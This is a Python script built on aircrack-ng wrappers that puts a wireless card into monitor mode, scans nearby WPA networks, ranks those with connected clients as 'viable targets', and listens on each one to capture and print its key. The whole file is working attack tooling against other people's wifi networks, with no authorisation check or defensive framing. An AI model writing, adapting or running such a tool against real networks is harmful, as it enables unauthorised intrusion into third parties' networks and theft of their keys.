#!/usr/bin/env python3

import asyncio
import os
import subprocess
import typing as t
from datetime import datetime, timedelta

import urwid

from aircrack.airmon import Airmon
from aircrack.airodump import Airodump, AccessPoint
from aircrack.models import WifiAdapter


def get_yes_no(message: str, *, default: bool = False) -> bool:
    yes_no = f"[{'Y' if default else 'y'}/{'n' if default else 'N'}]"

    answer = ''
    while answer not in ('y', 'n'):
        answer = input(f'{message} {yes_no} ').strip().lower() or ('y' if default else 'n')

    return answer == 'y'


def select_wifi_card() -> WifiAdapter:
    wifi_cards: t.Dict[str, WifiAdapter] = {i.interface: i for i in Airmon.get_wifi_adapters()}

    for wifi_card in wifi_cards.values():
        if wifi_card.monitoring_enabled:
            print()
            print(f'Monitoring enabled on {wifi_card.interface}')
            if get_yes_no(f'Continue with {wifi_card.interface}?', default=True):
                return wifi_card

    print('Available WLAN interfaces:')
    for wifi_card in wifi_cards.values():
        print(f'- {wifi_card}')

    interface = ''
    while interface not in wifi_cards.keys():
        interface = input('Please select interface: ').strip()

    return wifi_cards[interface]


def is_viable_target(access_point: AccessPoint):
    return (
        len(access_point.stations) > 0
        and access_point.id_length > 0
        and 'WPA' in access_point.privacy
    )


async def listen_for_networks(wifi_card: WifiAdapter, wait: timedelta = timedelta(minutes=1)):
    if not wifi_card.monitoring_enabled:
        Airmon.start_monitoring(wifi_card)

    start = datetime.now()

    print('Looking for viable targets...')
    async for access_points in Airodump(wifi_card.interface).stream_data():
        viable_targets = list(sorted(
            (i for i in access_points if is_viable_target(i)), key=lambda x: len(x.stations), reverse=True
        ))
        formatted_targets = ''.join(f'\n- {i.essid}({len(i.stations)})' for i in viable_targets)
        os.system('clear')
        print(f'Access points: {len(access_points)}')
        print(f'Viable targets:\n {formatted_targets}')
        if datetime.now() > start + wait:
            return access_points


async def listen_network(wifi_card: WifiAdapter, access_point: AccessPoint) -> str:
    async for access_points in Airodump(wifi_card.interface, access_point=access_point).stream_data():
        os.system('clear')
        print(f'Listening to network: {access_point.essid} ...')

        assert len(access_points) == 1
        access_point = access_points[0]
        if access_point.key:
            print('BENIZ', access_point.key)
            return access_point.key


async def main():
    wifi_card = select_wifi_card()
    access_points = await listen_for_networks(wifi_card)

    for access_point in access_points:
        if not is_viable_target(access_point):
            continue

        await listen_network(wifi_card, access_point)


def check_package_installed(command: str):
    try:
        subprocess.call([command], stdout=subprocess.PIPE)
    except FileNotFoundError:
        raise RuntimeError(f'Command {command} not found')


if __name__ == '__main__':
    check_package_installed('airmon-ng')
    try:
        asyncio.get_event_loop().run_until_complete(main())
    except KeyboardInterrupt:
        print()
    os.system('reset')
